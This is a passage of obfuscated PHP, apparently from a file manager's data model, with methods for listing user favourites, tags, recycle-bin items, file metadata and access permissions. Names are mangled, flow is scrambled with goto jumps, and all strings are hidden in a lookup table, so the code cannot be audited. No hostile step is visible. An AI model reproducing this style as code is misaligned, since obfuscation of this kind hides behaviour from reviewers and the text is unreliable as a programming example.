false; goto d‰ÆÒ”‹²; d‰ÆÒ”‹²: if (!$E‘¦„·¿ºÔ) { goto fã‚ñªˆ™ˆ; C÷øŠØ•‹“: $a¦¨ ¤’øÎ = array(); foreach ($E‘¦„·¿ºÔ as $Cîó•Ê»ñ­) { if (in_array($Cîó•Ê»ñ­, $E–‡¨Úè‰ì)) { continue; } $a¦¨ ¤’øÎ[] = $Cîó•Ê»ñ­; } goto aæÏçâ§Š£; fã‚ñªˆ™ˆ: $bÓ­½ˆÄí¹ = $FÉÑëÕÆÆ®[391]; $bÓ­½ˆÄí¹ .= $FÉÑëÕÆÆ®[392]; $bÓ­½ˆÄí¹ .= $FÉÑëÕÆÆ®[393]; goto d•í•¤ÇÀ½; d•í•¤ÇÀ½: $CïåøñèøÇ = $FÉÑëÕÆÆ®[394]; $E–‡¨Úè‰ì = explode($FÉÑëÕÆÆ®[47], $CïåøñèøÇ); $E‘¦„·¿ºÔ = explode($FÉÑëÕÆÆ®[47], $bÓ­½ˆÄí¹); goto C÷øŠØ•‹“; aæÏçâ§Š£: } $aøš¾Èœõ[$FÉÑëÕÆÆ®[75]] = $FÉÑëÕÆÆ®[395] . $aøš¾Èœõ[$FÉÑëÕÆÆ®[390]] . $FÉÑëÕÆÆ®[396]; $aøš¾Èœõ[$FÉÑëÕÆÆ®[29]] = $aøš¾Èœõ[$FÉÑëÕÆÆ®[397]] == 1 ? $FÉÑëÕÆÆ®[76] : $FÉÑëÕÆÆ®[173]; goto E½•³”†º×; E½•³”†º×: $aøš¾Èœõ[$FÉÑëÕÆÆ®[398]] = $this->typeName($aøš¾Èœõ[$FÉÑëÕÆÆ®[398]]); if ($aøš¾Èœõ[$FÉÑëÕÆÆ®[397]] != 1) { $aøš¾Èœõ[$FÉÑëÕÆÆ®[167]] = $aøš¾Èœõ[$FÉÑëÕÆÆ®[399]]; unset($aøš¾Èœõ[$FÉÑëÕÆÆ®[399]]); } $DĞœÉº¹‰ï = $E‘¦„·¿ºÔ; goto f˜×˜›½; f˜×˜›½: if (isset($aøš¾Èœõ[$FÉÑëÕÆÆ®[400]]) && $aøš¾Èœõ[$FÉÑëÕÆÆ®[400]][$FÉÑëÕÆÆ®[401]] == -1) { $DĞœÉº¹‰ï = $a¦¨ ¤’øÎ; } $aøš¾Èœõ = array_field_key($aøš¾Èœõ, $DĞœÉº¹‰ï); return $aøš¾Èœõ; goto b¸Õ¯¸ñÆÈ; b¸Õ¯¸ñÆÈ: } public function listUserFav() { goto cÁ’†Ü•Œù; f©«¦ÆÄåÕ: foreach ($FØÔ·”š¥× as &$Aœì¦øåØ) { $Aœì¦øåØ = array($A®ÂøóÆé´[406] => $Aœì¦øåØ[$A®ÂøóÆé´[388]], $A®ÂøóÆé´[407] => $Aœì¦øåØ[$A®ÂøóÆé´[28]], $A®ÂøóÆé´[408] => $Aœì¦øåØ[$A®ÂøóÆé´[75]], $A®ÂøóÆé´[409] => $Aœì¦øåØ[$A®ÂøóÆé´[29]], $A®ÂøóÆé´[410] => $Aœì¦øåØ[$A®ÂøóÆé´[192]], $A®ÂøóÆé´[411] => $Aœì¦øåØ[$A®ÂøóÆé´[83]]); if ($Aœì¦øåØ[$A®ÂøóÆé´[29]] == $A®ÂøóÆé´[403] && $Aø‘äÓË”Ç[$Aœì¦øåØ[$A®ÂøóÆé´[75]]]) { $Aœì¦øåØ[$A®ÂøóÆé´[84]] = $Aø‘äÓË”Ç[$Aœì¦øåØ[$A®ÂøóÆé´[75]]]; } } unset($Aœì¦øåØ); return $FØÔ·”š¥×; goto d’ ÛÀ½ƒ; fÖ©Ì™Œ¤: $F¸Íâ¬¦²ë = array_to_keyvalue($F¸Íâ¬¦²ë, $A®ÂøóÆé´[33], $A®ÂøóÆé´[75]); if ($F¸Íâ¬¦²ë) { $Aø‘äÓË”Ç = $this->listSource(array($A®ÂøóÆé´[404] => array($A®ÂøóÆé´[405], $F¸Íâ¬¦²ë))); } $Aø‘äÓË”Ç = array_to_keyvalue($Aø‘äÓË”Ç[$A®ÂøóÆé´[365]], $A®ÂøóÆé´[390]); goto f©«¦ÆÄåÕ; cÁ’†Ü•Œù: $A®ÂøóÆé´ =& $_SERVER[¹…ÕÄ]; $FØÔ·”š¥× = Model($A®ÂøóÆé´[402])->listData(); $F¸Íâ¬¦²ë = array_filter_by_field($FØÔ·”š¥×, $A®ÂøóÆé´[29], $A®ÂøóÆé´[403]); goto fÖ©Ì™Œ¤; d’ ÛÀ½ƒ: } public function listUserTag($aŒµ«èÆÇ¿) { goto fà‰Ø¸á; f¸Í÷Ûèßó: $f‡ğğÙ›«¼ = array_to_keyvalue($bäÎ±§µ–Ê[$CˆÌ÷§øñÓ[73]], $CˆÌ÷§øñÓ[33], $CˆÌ÷§øñÓ[390]); $bÕÍ¿‹“¿¤ = array_merge($f‡ğğÙ›«¼, $A£³Ç ‚‰); foreach ($D‘·ÔÆÃŠ´ as $BĞö¦®àœÏ) { if (!in_array($BĞö¦®àœÏ, $bÕÍ¿‹“¿¤)) { $bòŒÓâ’[] = $BĞö¦®àœÏ; } } goto FñëØİ£íÏ; FñëØİ£íÏ: if ($bòŒÓâ’) { Model($CˆÌ÷§øñÓ[414])->removeBySource($bòŒÓâ’); } return $bäÎ±§µ–Ê; goto fÕŸ‹ñ¹›; cŠÊƒ«÷ù: foreach ($f®™ŞÉ…³ as $E„Äö¨‚¨ => $dÍƒ½ò‡îÊ) { $DÈÒÜŒ­æŞ = !0; if (!$aŒµ«èÆÇ¿) { $D‘·ÔÆÃŠ´[] = $E„Äö¨‚¨; continue; } foreach ($aŒµ«èÆÇ¿ as $C¼ùäÙ›Ş) { if (!in_array($C¼ùäÙ›Ş, $dÍƒ½ò‡îÊ)) { $DÈÒÜŒ­æŞ = !1; break; } } if ($DÈÒÜŒ­æŞ) { $D‘·ÔÆÃŠ´[] = $E„Äö¨‚¨; } } if (!$D‘·ÔÆÃŠ´) { return array(); } $bäÎ±§µ–Ê = $this->listSource(array($CˆÌ÷§øñÓ[404] => array($CˆÌ÷§øñÓ[405], $D‘·ÔÆÃŠ´))); goto D©¤‚‚ã‡–; a‚‰Óã‹±²: $f®™ŞÉ…³ = array(); foreach ($câ„±Ë•Ï as $Dá§¨¦œ) { $BĞö¦®àœÏ = $Dá§¨¦œ[$CˆÌ÷§øñÓ[75]]; if (!$BĞö¦®àœÏ) { continue; } if (!isset($f®™ŞÉ…³[$BĞö¦®àœÏ])) { $f®™ŞÉ…³[$BĞö¦®àœÏ] = array(); } $f®™ŞÉ…³[$BĞö¦®àœÏ][] = $Dá§¨¦œ[$CˆÌ÷§øñÓ[413]]; } $D‘·ÔÆÃŠ´ = array(); goto cŠÊƒ«÷ù; fà‰Ø¸á: $CˆÌ÷§øñÓ =& $_SERVER[¹…ÕÄ]; if ($aŒµ«èÆÇ¿ && !is_array($aŒµ«èÆÇ¿)) { $aŒµ«èÆÇ¿ = array($aŒµ«èÆÇ¿); } $câ„±Ë•Ï = Model($CˆÌ÷§øñÓ[412])->listData(); goto a‚‰Óã‹±²; D©¤‚‚ã‡–: if (!$bäÎ±§µ–Ê || count($D‘·ÔÆÃŠ´) == $bäÎ±§µ–Ê[$CˆÌ÷§øñÓ[362]][$CˆÌ÷§øñÓ[363]]) { return $bäÎ±§µ–Ê; } $bòŒÓâ’ = array(); $A£³Ç ‚‰ = array_to_keyvalue($bäÎ±§µ–Ê[$CˆÌ÷§øñÓ[74]], $CˆÌ÷§øñÓ[33], $CˆÌ÷§øñÓ[390]); goto f¸Í÷Ûèßó; fÕŸ‹ñ¹›: } public function listUserRecycle() { $eÌ‡§Ïä‹„ =& $_SERVER[¹…ÕÄ]; $bëŞ½½¯“» = Model($eÌ‡§Ïä‹„[415])->listData(); if (!$bëŞ½½¯“») { return array(); } $e—Ô«ê»ï = array($eÌ‡§Ïä‹„[404] => array($eÌ‡§Ïä‹„[405], $bëŞ½½¯“»), $eÌ‡§Ïä‹„[416] => 1); return $this->listSource($e—Ô«ê»ï); } public function listSource($b¾÷­Á²Õß, $dÒ¹ÓÏÛ = 3000) { goto E¾ƒ²¢†£Â; E¾ƒ²¢†£Â: $Dó´‰ñÀİ =& $_SERVER[¹…ÕÄ]; if (!isset($b¾÷­Á²Õß[$Dó´‰ñÀİ[417]])) { $b¾÷­Á²Õß[$Dó´‰ñÀİ[417]] = 0; } $EÅèù¦¬ï® = $Dó´‰ñÀİ[418]; goto eä”ÇÙÖÇ ; eä”ÇÙÖÇ : $BĞÚÅØÚ¾Ù = $this->field($EÅèù¦¬ï®)->_makeOrder()->where($b¾÷­Á²Õß)->selectPage($dÒ¹ÓÏÛ); $this->_listDataApply($BĞÚÅØÚ¾Ù[$Dó´‰ñÀİ[365]]); $this->_listMake($BĞÚÅØÚ¾Ù); goto C‡àâÅªİ; C‡àâÅªİ: return $BĞÚÅØÚ¾Ù; goto e‰–‚•ò¨; e‰–‚•ò¨: } protected function _makeOrder() { goto A¹½ñ†ª®·; Eâ•¡×Á‚‹: $eŞô¯ò¥Ü… = array($a¡¸ ‰ğ[422] => $a¡¸ ‰ğ[423], $a¡¸ ‰ğ[424] => $a¡¸ ‰ğ[425]); $Có¢Âò˜À = array($a¡¸ ‰ğ[28] => $a¡¸ ‰ğ[28], $a¡¸ ‰ğ[77] => $a¡¸ ‰ğ[77], $a¡¸ ‰ğ[167] => $a¡¸ ‰ğ[399], $a¡¸ ‰ğ[426] => $a¡¸ ‰ğ[426], $a¡¸ ‰ğ[427] => $a¡¸ ‰ğ[428], $a¡¸ ‰ğ[192] => $a¡¸ ‰ğ[192], $a¡¸ ‰ğ[83] => $a¡¸ ‰ğ[83]); $c«íŸæãŸ½ = Input::get($a¡¸ ‰ğ[429], $a¡¸ ‰ğ[7], $dôÄŞ¬åØ, array_keys($Có¢Âò˜À)); goto E§‰Å§ö’–; E§‰Å§ö’–: $EèÄ×ÊÃÔ = Input::get($a¡¸ ‰ğ[430], $a¡¸ ‰ğ[7], $aŞ¯ÃÇ»ÜÏ, array_keys($eŞô¯ò¥Ü…)); if (!in_array($c«íŸæãŸ½, array_keys($Có¢Âò˜À))) { $c«íŸæãŸ½ = $a¡¸ ‰ğ[28]; } if (!in_array($EèÄ×ÊÃÔ, array_keys($eŞô¯ò¥Ü…))) { $c«íŸæãŸ½ = $a¡¸ ‰ğ[422]; } goto E½é™¸õÆÊ; E½é™¸õÆÊ: if ($c«íŸæãŸ½ == $a¡¸ ‰ğ[28]) { } $A¶íˆ†ãÉ = $a¡¸ ‰ğ[431] . $Có¢Âò˜À[$c«íŸæãŸ½] . $a¡¸ ‰ğ[50] . $eŞô¯ò¥Ü…[$EèÄ×ÊÃÔ]; return $this->order(rtrim(trim($A¶íˆ†ãÉ), $a¡¸ ‰ğ[47])); goto Eéøâ§· Ã; A¹½ñ†ª®·: $a¡¸ ‰ğ =& $_SERVER[¹…ÕÄ]; $dôÄŞ¬åØ = Model($a¡¸ ‰ğ[419])->get($a¡¸ ‰ğ[420]); $aŞ¯ÃÇ»ÜÏ = Model($a¡¸ ‰ğ[419])->get($a¡¸ ‰ğ[421]); goto Eâ•¡×Á‚‹; Eéøâ§· Ã: } protected function _listDataApplyItem($a›”œ”îÏ, $b÷À«œ’õŞ = false) { $b’Ë‰¬ÒÉÌ = array($a›”œ”îÏ); $this->_listDataApply($b’Ë‰¬ÒÉÌ, $b÷À«œ’õŞ); return $b’Ë‰¬ÒÉÌ[0]; } protected function _listDataApply(&$c÷ø÷‡ëì©, $bÏŒŸã…¦ô = false) { goto bİ¨Ğèï¡Ö; AÄµŒğ½º: $this->_listAppendPath($c÷ø÷‡ëì©); $this->_listAppendAuth($c÷ø÷‡ëì©); $this->_listAppendSourceInfo($c÷ø÷‡ëì©, $F‚çùêŞ‰); goto aµğ½·¶˜ñ; aµğ½·¶˜ñ: $this->_listAppendUser($c÷ø÷‡ëì©); $this->_listFilterInfo($c÷ø÷‡ëì©, $bÏŒŸã…¦ô); goto E­ñ÷òÜ½; bá×Ú»á‹š: $F‚çùêŞ‰ = array_unique($F‚çùêŞ‰); $this->_listSourceCache($c÷ø÷‡ëì©); if (!$bÏŒŸã…¦ô) { $this->_listAppendMeta($c÷ø÷‡ëì©, $F‚çùêŞ‰); $this->_listAppendFileMeta($c÷ø÷‡ëì©, $F‚çùêŞ‰); $this->_listAppendChildren($c÷ø÷‡ëì©, $F‚çùêŞ‰); } goto AÄµŒğ½º; bİ¨Ğèï¡Ö: $D¼¡Í«ô¡ =& $_SERVER[¹…ÕÄ]; if (!$c÷ø÷‡ëì©) { $c÷ø÷‡ëì© = array(); return; } $F‚çùêŞ‰ = array_to_keyvalue($c÷ø÷‡ëì©, $D¼¡Í«ô¡[33], $D¼¡Í«ô¡[390]); goto bá×Ú»á‹š; E­ñ÷òÜ½: } protected function _listSourceCache($FÔèØªµ§Œ) { $DÚ•ï„‰ì =& $_SERVER[¹…ÕÄ]; foreach ($FÔèØªµ§Œ as $c™Œöê›®„) { self::$cacheSourceInfo[$DÚ•ï„‰ì[432] . $c™Œöê›®„[$DÚ•ï„‰ì[390]]] = $c™Œöê›®„; } } protected function _listFilterInfo(&$eÎŠˆÙÂŒ, $fÌÁ—“†‚ = false) { $eÖÊ¶ğÍÔæ =& $_SERVER[¹…ÕÄ]; foreach ($eÎŠˆÙÂŒ as &$AÓ¦Çíà”) { $AÓ¦Çíà” = $this->pathInfoFilter($AÓ¦Çíà”); self::$cachePathInfo[$eÖÊ¶ğÍÔæ[433] . intval($fÌÁ—“†‚) . $eÖÊ¶ğÍÔæ[434] . $AÓ¦Çíà”[$eÖÊ¶ğÍÔæ[390]]] = $AÓ¦Çíà”; } unset($AÓ¦Çíà”); } protected function _listMake(&$Cáèƒéî³) { $f³…ù¤‹ï¥ =& $_SERVER[¹…ÕÄ]; $Cáèƒéî³[$f³…ù¤‹ï¥[74]] = array(); $Cáèƒéî³[$f³…ù¤‹ï¥[73]] = array(); foreach ($Cáèƒéî³[$f³…ù¤‹ï¥[365]] as $d´Ò‹¡øÌ¹) { $C¬åÚÇ…• = $d´Ò‹¡øÌ¹[$f³…ù¤‹ï¥[397]] == 1 ? $f³…ù¤‹ï¥[74] : $f³…ù¤‹ï¥[73]; $Cáèƒéî³[$C¬åÚÇ…•][] = $d´Ò‹¡øÌ¹; } unset($Cáèƒéî³[$f³…ù¤‹ï¥[365]]); } protected function _listAppendMeta(&$B»ÊİÆÕ…å, $A¶ò¾¤¬›È) { goto bõ¦Æ”Œ°; A´£¼ÎÉĞÈ: foreach ($e´…ˆÅÛŞÔ as $dŠÖè°È¿Ö) { if (!isset($C‹ôßæ»ÅÒ[$dŠÖè°È¿Ö[$eå˜µ øµÔ[390]]])) { $C‹ôßæ»ÅÒ[$dŠÖè°È¿Ö[$eå˜µ øµÔ[390]]] = array(); } if (in_array($dŠÖè°È¿Ö[$eå˜µ øµÔ[92]], $bô¼çÕ¨Æ“)) { continue; } $C‹ôßæ»ÅÒ[$dŠÖè°È¿Ö[$eå˜µ øµÔ[390]]][$dŠÖè°È¿Ö[$eå˜µ øµÔ[92]]] = $dŠÖè°È¿Ö[$eå˜µ øµÔ[370]]; } foreach ($B»ÊİÆÕ…å as &$d­òíÚù®œ) { $d­òíÚù®œ[$eå˜µ øµÔ[439]] = !1; if (isset($C‹ôßæ»ÅÒ[$d­òíÚù®œ[$eå˜µ øµÔ[390]]])) { $d­òíÚù®œ[$eå˜µ øµÔ[439]] = $C‹ôßæ»ÅÒ[$d­òíÚù®œ[$eå˜µ øµÔ[390]]]; } if ($this->fileIsLock($d­òíÚù®œ) && $d­òíÚù®œ[$eå˜µ øµÔ[400]]) { $CŞÂÜ”„ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $d­òíÚù®œ[$eå˜µ øµÔ[400]][$eå˜µ øµÔ[401]] = AuthModel::authDisable($d­òíÚù®œ[$eå˜µ øµÔ[400]][$eå˜µ øµÔ[401]], $CŞÂÜ”„); $d­òíÚù®œ[$eå˜µ øµÔ[400]][$eå˜µ øµÔ[440]][$eå˜µ øµÔ[400]] = $d­òíÚù®œ[$eå˜µ øµÔ[400]][$eå˜µ øµÔ[401]]; } } unset($d­òíÚù®œ); goto A“·êÕİÓİ; bõ¦Æ”Œ°: $eå˜µ øµÔ =& $_SERVER[¹…ÕÄ]; $B°Ì—–É¼ = array($eå˜µ øµÔ[404] => array($eå˜µ øµÔ[405], $A¶ò¾¤¬›È)); $e´…ˆÅÛŞÔ = Model($eå˜µ øµÔ[435])->field($eå˜µ øµÔ[436])->where($B°Ì—–É¼)->select(); goto açÁ —½Õ; açÁ —½Õ: if (!$e´…ˆÅÛŞÔ) { return; } $bô¼çÕ¨Æ“ = array($eå˜µ øµÔ[437], $eå˜µ øµÔ[438]); $C‹ôßæ»ÅÒ = array(); goto A´£¼ÎÉĞÈ; A“·êÕİÓİ: } protected function _listAppendFileMeta(&$eÅÆì£ùŠ, $B·‘‹êˆ) { goto eÂŞáÇÖ©à; aè±‚¼á‡¾: $aäË¦Œæ¡Š = Model($CÎ„ĞÂ¦×´[444])->field($E†ˆù´¯Ø)->where($FªŠÒº¿éÇ)->select(); $aäË¦Œæ¡Š = array_to_keyvalue($aäË¦Œæ¡Š, $CÎ„ĞÂ¦×´[441]); $d¨¤¤‘‡š’ = Model($CÎ„ĞÂ¦×´[445])->field($CÎ„ĞÂ¦×´[446])->where($FªŠÒº¿éÇ)->select(); goto C¢Ş‚Ïˆ¸Õ; d³à¸ÉªÙ„: if (!$aÒ–©ßö¨‘) { return; } $FªŠÒº¿éÇ = array($CÎ„ĞÂ¦×´[442] => array($CÎ„ĞÂ¦×´[405], $aÒ–©ßö¨‘)); $E†ˆù´¯Ø = $CÎ„ĞÂ¦×´[443]; goto aè±‚¼á‡¾; C¢Ş‚Ïˆ¸Õ: $d¨¤¤‘‡š’ = $d¨¤¤‘‡š’ ? $d¨¤¤‘‡š’ : array(); $FÒÊ£Ÿ†† = array(); foreach ($d¨¤¤‘‡š’ as $cîŠ“É×î¤) { if (!isset($FÒÊ£Ÿ††[$cîŠ“É×î¤[$CÎ„ĞÂ¦×´[441]]])) { $FÒÊ£Ÿ††[$cîŠ“É×î¤[$CÎ„ĞÂ¦×´[441]]] = array(); } $FÒÊ£Ÿ††[$cîŠ“É×î¤[$CÎ„ĞÂ¦×´[441]]][$cîŠ“É×î¤[$CÎ„ĞÂ¦×´[92]]] = $cîŠ“É×î¤[$CÎ„ĞÂ¦×´[370]]; } goto AŠ¬ç®å´; AŠ¬ç®å´: foreach ($eÅÆì£ùŠ as &$FªƒìŸ¼¡¡) { goto Bİ“‡²†·; cË†¨ìí™Â: if (isset($FªƒìŸ¼¡¡[$CÎ„ĞÂ¦×´[163]][$CÎ„ĞÂ¦×´[162]])) { $FªƒìŸ¼¡¡[$CÎ„ĞÂ¦×´[162]] = json_decode($FªƒìŸ¼¡¡[$CÎ„ĞÂ¦×´[163]][$CÎ„ĞÂ¦×´[162]], !0); unset($FªƒìŸ¼¡¡[$CÎ„ĞÂ¦×´[163]][$CÎ„ĞÂ¦×´[162]]); } goto fÈ–ó¥ŞŸ™; AëÎƒ“›÷¥: unset($aäË¦Œæ¡Š[$fèáŠŞŠÄÀ][$CÎ„ĞÂ¦×´[75]]); $cñƒ­¯Û = is_array($FÒÊ£Ÿ††[$fèáŠŞŠÄÀ]) ? $FÒÊ£Ÿ††[$fèáŠŞŠÄÀ] : array(); $FªƒìŸ¼¡¡[$CÎ„ĞÂ¦×´[163]] = array_merge($cñƒ­¯Û, $aäË¦Œæ¡Š[$fèáŠŞŠÄÀ]); goto cË†¨ìí™Â; eˆÚÑ™ñÏ: $bæ­æ•³×Ú[$CÎ„ĞÂ¦×´[77]] = $FªƒìŸ¼¡¡[$CÎ„ĞÂ¦×´[77]]; $bæ­æ•³×Ú[$CÎ„ĞÂ¦×´[28]] = $FªƒìŸ¼¡¡[$CÎ„ĞÂ¦×´[28]]; if (!isset(self::$cacheFileInfo[$CÎ„ĞÂ¦×´[447] . $fèáŠŞŠÄÀ])) { self::$cacheFileInfo[$CÎ„ĞÂ¦×´[447] . $fèáŠŞŠÄÀ] = array_merge(array(), $bæ­æ•³×Ú); } goto AëÎƒ“›÷¥; Bİ“‡²†·: $fèáŠŞŠÄÀ = $FªƒìŸ¼¡¡[$CÎ„ĞÂ¦×´[441]]; if (!$fèáŠŞŠÄÀ || !isset($aäË¦Œæ¡Š[$fèáŠŞŠÄÀ])) { continue; } $bæ­æ•³×Ú = $aäË¦Œæ¡Š[$fèáŠŞŠÄÀ]; goto eˆÚÑ™ñÏ; fÈ–ó¥ŞŸ™: } unset($FªƒìŸ¼¡¡); goto Fãõè‡•®¤; eÂŞáÇÖ©à: $CÎ„ĞÂ¦×´ =& $_SERVER[¹…ÕÄ]; $aÒ–©ßö¨‘ = array_to_keyvalue($eÅÆì£ùŠ, $CÎ„ĞÂ¦×´[33], $CÎ„ĞÂ¦×´[441]); $aÒ–©ßö¨‘ = array_filter(array_unique($aÒ–©ßö¨‘)); goto d³à¸ÉªÙ„; Fãõè‡•®¤: } protected function _listAppendSourceInfo(&$f˜—ÏìÓ¹´, $E»–ÂÚŸñã) { goto AµÜÁœÆøó; AµÜÁœÆøó: $aø“ìùó×ï =& $_SERVER[¹…ÕÄ]; if (!defined($aø“ìùó×ï[448])) { return; } $dĞÙî¼éğÜ = Model($aø“ìùó×ï[449])->listData(); goto B‹‡Ÿ¤Üï±; B‹‡Ÿ¤Üï±: $e¦¹‡¡á£° = Model($aø“ìùó×ï[412])->listData(); $BÑš»Ô§Ø‹ = Model($aø“ìùó×ï[402])->listData(); $CùÊŠëßÑË = Model($aø“ìùó×ï[450])->listSimple(); goto e–âŠÒ™ì; cæÃÊöİİÄ: $A¡‘¸©£ß = array_to_keyvalue_group($CùÊŠëßÑË, $aø“ìùó×ï[390]); foreach ($f˜—ÏìÓ¹´ as &$AÍ‡ïë‡×´) { $AÍ‡ïë‡×´[$aø“ìùó×ï[84]] = array($aø“ìùó×ï[451] => 0, $aø“ìùó×ï[452] => 0, $aø“ìùó×ï[453] => 0); if (isset($a…†«ôğİ‹[$AÍ‡ïë‡×´[$aø“ìùó×ï[390]]])) { $AÍ‡ïë‡×´[$aø“ìùó×ï[84]][$aø“ìùó×ï[454]] = 1; $AÍ‡ïë‡×´[$aø“ìùó×ï[84]][$aø“ìùó×ï[455]] = $a…†«ôğİ‹[$AÍ‡ïë‡×´[$aø“ìùó×ï[390]]][$aø“ìùó×ï[28]]; } if (isset($cİÒŒŞ‚Ä‡[$AÍ‡ïë‡×´[$aø“ìùó×ï[390]]])) { $AÍ‡ïë‡×´[$aø“ìùó×ï[84]][$aø“ìùó×ï[456]] = array(); foreach ($cİÒŒŞ‚Ä‡[$AÍ‡ïë‡×´[$aø“ìùó×ï[390]]] as $f—äµ“Ãõ) { $CøÎ®‰¼¢ï = $AÔÓ¶š°œ[$f—äµ“Ãõ]; $AÍ‡ïë‡×´[$aø“ìùó×ï[84]][$aø“ìùó×ï[456]][] = array($aø“ìùó×ï[457] => $CøÎ®‰¼¢ï[$aø“ìùó×ï[388]], $aø“ìùó×ï[407] => $CøÎ®‰¼¢ï[$aø“ìùó×ï[28]], $aø“ìùó×ï[458] => $CøÎ®‰¼¢ï[$aø“ìùó×ï[459]]); } } if (isset($A¡‘¸©£ß[$AÍ‡ïë‡×´[$aø“ìùó×ï[390]]])) { $AÍ‡ïë‡×´[$aø“ìùó×ï[84]][$aø“ìùó×ï[460]] = array(); foreach ($A¡‘¸©£ß[$AÍ‡ïë‡×´[$aø“ìùó×ï[390]]] as $Dë–ò¥àïŒ) { $AÍ‡ïë‡×´[$aø“ìùó×ï[84]][$aø“ìùó×ï[460]] = array($aø“ìùó×ï[461] => $Dë–ò¥àïŒ[$aø“ìùó×ï[462]], $aø“ìùó×ï[463] => $Dë–ò¥àïŒ[$aø“ìùó×ï[464]], $aø“ìùó×ï[465] => $Dë–ò¥àïŒ[$aø“ìùó×ï[390]], $aø“ìùó×ï[466] => $Dë–ò¥àïŒ[$aø“ìùó×ï[467]], $aø“ìùó×ï[468] => $Dë–ò¥àïŒ[$aø“ìùó×ï[469]], $aø“ìùó×ï[470] => $Dë–ò¥àïŒ[$aø“ìùó×ï[470]], $aø“ìùó×ï[471] => $Dë–ò¥àïŒ[$aø“ìùó×ï[471]]); } } } unset($AÍ‡ïë‡×´); goto C¤œ‰Ã–Ô; C¤œ‰Ã–Ô: return $f˜—ÏìÓ¹´; goto FÕà¸Õ²…µ; e–âŠÒ™ì: $AÔÓ¶š°œ = array_to_keyvalue($dĞÙî¼éğÜ, $aø“ìùó×ï[388]); $cİÒŒŞ‚Ä‡ = array_to_keyvalue_group($e¦¹‡¡á£°, $aø“ìùó×ï[75], $aø“ìùó×ï[413]); $a…†«ôğİ‹ = array_to_keyvalue($BÑš»Ô§Ø‹, $aø“ìùó×ï[75]); goto cæÃÊöİİÄ; FÕà¸Õ²…µ: } protected function _listAppendChildren(&$b„›á©ù, $fÓõÈÅ«ğ) { goto fóĞ±ß—¶; A‚•ˆ˜¯: $BÍÊÄÖ²¹ö = array($aõò†½©Ì”[472] => array($aõò†½©Ì”[7], $e‚õ¿«Ö´¥)); $a½Ç¹£åÊ¿ = array($aõò†½©Ì”[472], $aõò†½©Ì”[397], $aõò†½©Ì”[473] => $aõò†½©Ì”[474]); $fƒöÉ”¼§ = $this->field($a½Ç¹£åÊ¿)->where($BÍÊÄÖ²¹ö)->group($aõò†½©Ì”[475])->select(); goto c‡ÌäÎƒç; c‡ÌäÎƒç: $dİ œ¾Ş²‚ = array(); foreach ($fƒöÉ”¼§ as $A§¤Ã¨»‘) { $AÖá¥µ““® = $A§¤Ã¨»‘[$aõò†½©Ì”[472]]; $AªÎë•™Ó = $A§¤Ã¨»‘[$aõò†½©Ì”[397]] == $aõò†½©Ì”[86] ? $aõò†½©Ì”[202] : $aõò†½©Ì”[201]; if (!isset($dİ œ¾Ş²‚[$AÖá¥µ““®])) { $dİ œ¾Ş²‚[$AÖá¥µ““®] = array($aõò†½©Ì”[201] => 0, $aõò†½©Ì”[202] => 0); } $dİ œ¾Ş²‚[$AÖá¥µ““®][$AªÎë•™Ó] += $A§¤Ã¨»‘[$aõò†½©Ì”[474]]; } foreach ($b„›á©ù as &$EÊ†¾ÉİåÑ) { if (!$EÊ†¾ÉİåÑ[$aõò†½©Ì”[397]]) { continue; } $bñÉØàôÆŠ = is_array($dİ œ¾Ş²‚[$EÊ†¾ÉİåÑ[$aõò†½©Ì”[390]]]) ? $dİ œ¾Ş²‚[$EÊ†¾ÉİåÑ[$aõò†½©Ì”[390]]] : $CáÃ’óÖÔó; $EÊ†¾ÉİåÑ[$aõò†½©Ì”[202]] = $bñÉØàôÆŠ[$aõò†½©Ì”[202]]; $EÊ†¾ÉİåÑ[$aõò†½©Ì”[201]] = $bñÉØàôÆŠ[$aõò†½©Ì”[201]]; unset($EÊ†¾ÉİåÑ[$aõò†½©Ì”[399]]); } goto dÉŒåèö„Ù; fóĞ±ß—¶: $aõò†½©Ì” =& $_SERVER[¹…ÕÄ]; $e‚õ¿«Ö´¥ = array(); $CáÃ’óÖÔó = array($aõò†½©Ì”[201] => 0, $aõò†½©Ì”[202] => 0); goto b˜ÚÊñ¶×ˆ; dÉŒåèö„Ù: unset($EÊ†¾ÉİåÑ); goto AÔ‹’…¬´Æ; b˜ÚÊñ¶×ˆ: foreach ($b„›á©ù as &$EÊ†¾ÉİåÑ) { if (!$EÊ†¾ÉİåÑ[$aõò†½©Ì”[397]]) { continue; } $e‚õ¿«Ö´¥[] = $EÊ†¾ÉİåÑ[$aõò†½©Ì”[390]]; } unset($EÊ†¾ÉİåÑ); if (!$e‚õ¿«Ö´¥) { return; } goto A‚•ˆ˜¯; AÔ‹’…¬´Æ: } protected function _listAppendAuth(&$f¿×ÅŠ‘éñ) { goto d¨î´¡‰™Â; Böô¨ğÊÅÔ: $BùÓ•±™áî = Model($bÍíõÍ„ÜÚ[476])->getSourceList($eØ‚æå‘àñ, $fŞ™ŞĞ­î§); foreach ($f¿×ÅŠ‘éñ as $fƒØ¡›Û°° => &$d‡Ó¯¶¸¹) { $d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[400]] = $BùÓ•±™áî[$d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[390]]]; if (!$d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[400]] && $d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[398]] == self::TYPE_GROUP) { $d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[400]] = Action($bÍíõÍ„ÜÚ[477])->pathGroupAuthMake($d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[478]]); if (!$d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[400]] && !_get($GLOBALS, $bÍíõÍ„ÜÚ[479])) { $d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[194]] = !1; $d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[193]] = !1; } } if ($d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[400]]) { $d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[194]] = AuthModel::authCheckEdit($d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[400]][$bÍíõÍ„ÜÚ[401]]); $d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[193]] = AuthModel::authCheckView($d‡Ó¯¶¸¹[$bÍíõÍ„ÜÚ[400]][$bÍíõÍ„ÜÚ[401]]); } $this->groupPathDisplay($d‡Ó¯¶¸¹); } unset($d‡Ó¯¶¸¹); goto e¤òù®ÑôÈ; d¨î´¡‰™Â: $bÍíõÍ„ÜÚ 